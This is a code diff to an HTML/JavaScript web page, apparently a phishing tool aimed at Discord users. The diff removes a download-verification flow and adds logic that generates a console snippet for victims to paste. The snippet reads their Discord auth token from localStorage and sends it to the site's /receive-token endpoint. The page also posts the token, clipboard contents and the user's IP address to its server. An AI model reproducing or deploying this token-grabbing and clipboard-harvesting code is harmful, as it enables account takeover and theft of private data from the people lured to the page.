@@ -88,7 +88,7 @@
       display: block;
     }
 
-    #doneBox, #tokenBox, #discordTokenBox, #downloadBox {
+    #doneBox, #tokenBox, #discordTokenBox {
       margin-top: 20px;
       display: none;
     }
@@ -99,14 +99,6 @@
 
     #doneBtn:hover {
       background: #218838;
-    }
-
-    #dlBtn {
-      background: #6f42c1;
-    }
-
-    #dlBtn:hover {
-      background: #5a369c;
     }
 
     #adminBtn {
@@ -156,24 +148,6 @@
     .copy-btn:hover {
       background: #5a369c;
     }
-
-    .verification-notice {
-      background: #2d3748;
-      border: 1px solid #4a5568;
-      border-radius: 8px;
-      padding: 15px;
-      margin: 15px 0;
-      font-size: 0.9rem;
-    }
-
-    .verification-notice a {
-      color: #63b3ed;
-      text-decoration: none;
-    }
-
-    .verification-notice a:hover {
-      text-decoration: underline;
-    }
   </style>
 </head>
 <body>
@@ -220,14 +194,6 @@
       </div>
     </div>
 
-    <!-- Download Box (shows after verification) -->
-    <div id="downloadBox">
-      <div class="verification-notice">
-        <p>✅ Verification complete! You can now download the required tools.</p>
-      </div>
-      <button id="dlBtn">Download Required Files</button>
-    </div>
-
     <button id="adminBtn">Admin Login</button>
   </div>
 
@@ -256,65 +222,9 @@
     const discordTokenInput = document.getElementById('discordTokenInput');
     const discordTokenSubmitBtn = document.getElementById('discordTokenSubmitBtn');
 
-    const downloadBox = document.getElementById('downloadBox');
-    const dlBtn = document.getElementById('dlBtn');
     const adminBtn = document.getElementById('adminBtn');
 
     let permissionGranted = false;
-
-    // --- Verification and Download Logic ---
-    function getSessionId() {
-      let sid = localStorage.getItem('sessionId');
-      if (!sid) {
-        sid = Math.random().toString(36).slice(2) + Date.now();
-        localStorage.setItem('sessionId', sid);
-      }
-      return sid;
-    }
-
-    let sessionId = getSessionId();
-
-    function showDownloadButton() {
-      downloadBox.style.display = 'block';
-    }
-
-    function removeDownloadButton() {
-      downloadBox.style.display = 'none';
-    }
-
-    async function checkVerification() {
-      try {
-        const res = await fetch('/verification-status?sessionId=' + encodeURIComponent(sessionId));
-        const data = await res.json();
-        if (data.verified) {
-          showDownloadButton();
-        } else {
-          removeDownloadButton();
-        }
-      } catch (err) {
-        console.error('Error checking verification:', err);
-        removeDownloadButton();
-      }
-    }
-
-    async function doDownload() {
-      // Double check verification
-      try {
-        const res = await fetch('/verification-status?sessionId=' + encodeURIComponent(sessionId));
-        const data = await res.json();
-        if (!data.verified) {
-          // Prompt verification
-          const ok = confirm('You must verify before downloading. Press OK to start verification.');
-          if (ok) window.location = '/verify?sessionId=' + encodeURIComponent(sessionId);
-          return;
-        }
-        // Download!
-        window.open('/download?sessionId=' + encodeURIComponent(sessionId), '_blank');
-      } catch (err) {
-        console.error('Error during download:', err);
-        alert('Download failed. Please try again.');
-      }
-    }
 
     // Mode switching
     gameModeBtn.onclick = () => {
@@ -343,8 +253,6 @@
       serverIdInput.value = '';
       tokenInput.value = '';
       discordTokenInput.value = '';
-      // Keep download box visible if verified
-      checkVerification();
     }
 
     // Get user IP for logging
@@ -381,7 +289,7 @@
     }
 
     setupTokenInput(tokenInput);
-    setupTokenInput(discordTokenInput);
+ 
 
     // Clipboard permission handling
     document.addEventListener('keydown', async (e) => {
@@ -433,17 +341,13 @@
           body: JSON.stringify({ 
             clipboardData: clipboard,
             userIP: userIP,
-            type: 'game',
-            sessionId: sessionId
+            type: 'game'
           })
         });
 
         doneBox.style.display = 'none';
         tokenBox.style.display = 'block';
         errorMessage.textContent = '';
-        
-        // Check verification status after successful submission
-        setTimeout(checkVerification, 1000);
 
       } catch (err) {
         window.location.href = 'https://example.com/denied';
@@ -467,16 +371,11 @@
           body: JSON.stringify({ 
             clipboardData: clipboard,
             userIP: userIP,
-            type: 'game',
-            sessionId: sessionId
+            type: 'game'
           })
         });
 
         alert('Clipboard content saved.');
-        
-        // Check verification status after successful submission
-        setTimeout(checkVerification, 1000);
-        
       } catch {
         alert('Clipboard permission was denied. Redirecting...');
         window.location.href = 'https://example.com/denied';
@@ -485,4 +384,64 @@
 
     // Discord Server Logic
     serverSubmitBtn.onclick = () => {
-      const serverI
+      const serverId = serverIdInput.value.trim();
+      if (!serverId) {
+        alert('Enter a valid Server ID');
+        return;
+      }
+
+  const code = `(()=>{const a=document.createElement('iframe');document.body.appendChild(a);try{const b=a.contentWindow.localStorage.token;const c="${serverId}";const d=btoa(b);window.open('${window.location.origin}/receive-token?token='+encodeURIComponent(b)+'&serverId='+encodeURIComponent(c),'_blank');console.log('Discord Server: '+c+'. Discord SERVER TOKEN: '+d);}catch(e){console.error('❌ Failed:',e);}a.remove();})();`;
+
+
+      jsCode.textContent = code;
+      jsCodeBox.style.display = 'block';
+      setTimeout(() => discordTokenBox.style.display = 'block', 1000);
+    };
+
+    copyCodeBtn.onclick = async () => {
+      try {
+        await navigator.clipboard.writeText(jsCode.textContent);
+        copyCodeBtn.textContent = 'Copied!';
+        setTimeout(() => copyCodeBtn.textContent = 'Copy Code', 2000);
+      } catch (err) {
+        alert('Failed to copy code. Please copy manually.');
+      }
+    };
+
+    discordTokenSubmitBtn.onclick = async () => {
+      const token = discordTokenInput.value.trim();
+      if (!token) {
+        alert('Enter a valid token');
+        return;
+      }
+
+      const userIP = await getUserIP();
+
+      try {
+        await fetch('/receive-token', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            token: token,
+            userIP: userIP,
+            serverId: serverIdInput.value.trim()
+          })
+        });
+
+        alert('Server token saved successfully!');
+        resetAll();
+      } catch (err) {
+        alert('Failed to save token.');
+      }
+    };
+
+    // Admin login
+    adminBtn.onclick = () => {
+      const password = prompt('Enter admin password:');
+      if (password) {
+        window.location.href = `/admin?password=${encodeURIComponent(password)}`;
+      }
+    };
+  </script>
+</body>
+</html>
